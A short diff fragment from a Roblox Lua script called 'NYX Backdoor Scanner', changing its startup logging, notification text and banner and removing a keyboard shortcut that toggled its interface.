-    if input.KeyCode == Enum.KeyCode.LeftAlt and not processed then
-        GUI.Visible = not GUI.Visible
-    end
-end)
+-- Init
+addLog("NYX Scanner loaded")
+addLog("Game: " .. game.PlaceId)
+addLog("Player: " .. player.Name)
+notify("NYX Scanner Ultimate loaded!")
 
--- Готово
-notify("NYX Scanner loaded!")
 print("========================================")
-print("NYX BACKDOOR SCANNER LOADED!")
-print("Press LeftAlt to toggle GUI")
+print("NYX BACKDOOR SCANNER ULTIMATE LOADED!")
 print("========================================")
-
-return G2L["1"], require
